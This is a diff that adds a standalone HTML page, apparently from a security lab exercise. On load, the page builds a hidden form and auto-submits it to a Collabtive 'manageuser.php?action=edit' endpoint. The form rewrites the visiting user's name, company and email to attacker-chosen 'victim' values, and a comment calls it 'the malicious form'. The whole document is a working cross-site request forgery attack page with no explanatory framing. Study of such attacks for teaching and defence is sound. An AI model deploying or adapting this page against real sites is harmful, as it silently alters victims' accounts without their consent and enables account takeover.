@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+	<script type="text/javascript">
+		function executeOnLoad(){
+			var createform = document.createElement('form'); // Create New Element Form
+			createform.setAttribute("action", "http://collabtive/manageuser.php?action=edit"); // Setting Action Attribute on Form
+			createform.setAttribute("method", "post"); // Setting Method Attribute on Form
+			document.body.appendChild(createform);
+
+			var inputelement = document.createElement('input'); // Create Input Field for Name
+			inputelement.setAttribute("type", "text");
+			inputelement.setAttribute("name", "name");
+			inputelement.setAttribute("id", "name");
+			inputelement.setAttribute("realname", "name");
+			inputelement.setAttribute("value", "victim");
+			createform.appendChild(inputelement);
+
+
+			var inputelement = document.createElement('input'); // Create Input Field for Company
+			inputelement.setAttribute("type", "text");
+			inputelement.setAttribute("name", "company");
+			inputelement.setAttribute("id", "company");
+			inputelement.setAttribute("value", "VictimCompany"); // Set the Company for user to VictimCompany
+			createform.appendChild(inputelement);
+
+			var emailelement = document.createElement('input'); // Create Input Field for E-mail
+			emailelement.setAttribute("type", "text");
+			emailelement.setAttribute("name", "email");
+			emailelement.setAttribute("id", "email");
+			emailelement.setAttribute("realname", "Email");			
+			emailelement.setAttribute("value", "victim@VictimCompany.com"); // Set the Email for user to victim@VictimCompany.com
+			createform.appendChild(emailelement);
+
+			createform.submit(); //Submit the form
+		}
+
+		// Submit the malicious form on window load
+		window.onload = function() {executeOnLoad();}	
+	</script>
+</body>
+</html>
